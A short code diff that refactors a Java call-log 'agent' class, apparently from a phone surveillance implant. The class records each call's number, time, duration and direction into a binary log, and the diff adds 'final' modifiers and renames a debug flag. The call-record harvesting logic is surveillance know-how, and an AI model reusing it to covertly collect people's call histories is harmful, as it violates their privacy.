@@ -79,13 +79,13 @@ public final class CallListAgent extends Agent implements CallListObserver {
 
     public void callLogAdded(String number, String name, Date date,
             int duration, boolean outgoing, boolean missed) {
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("number: " + number + " date: " + date + " duration: "
                 + duration + " outgoing: " + outgoing + " missed: " + missed);
         //#endif
 
-        String nametype = "u";
-        String note = "no notes";
+        final String nametype = "u";
+        final String note = "no notes";
 
         //#ifdef DBC
         Check.requires(number != null, "callLogAdded null number");
@@ -103,19 +103,20 @@ public final class CallListAgent extends Agent implements CallListObserver {
         len += wsize(note);
         len += wsize(nametype);
 
-        byte[] data = new byte[len];
+        final byte[] data = new byte[len];
 
         final DataBuffer databuffer = new DataBuffer(data, 0, len, false);
 
-        DateTime from = new DateTime(date);
-        DateTime to = new DateTime(new Date(date.getTime() + duration * 1000));
+        final DateTime from = new DateTime(date);
+        final DateTime to = new DateTime(new Date(date.getTime() + duration
+                * 1000));
 
         databuffer.writeInt(len);
         databuffer.writeInt(LOG_CALLIST_VERSION);
         databuffer.writeLong(from.getFiledate());
         databuffer.writeLong(to.getFiledate());
 
-        int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
+        final int flags = (outgoing ? 1 : 0) + (missed ? 0 : 6);
         databuffer.writeInt(flags);
 
         //#ifdef DBC
@@ -130,7 +131,7 @@ public final class CallListAgent extends Agent implements CallListObserver {
 
         log.createLog(getAdditionalData());
 
-        byte[] array = databuffer.getArray();
+        final byte[] array = databuffer.getArray();
         log.writeLog(array, 0);
         log.close();
     }
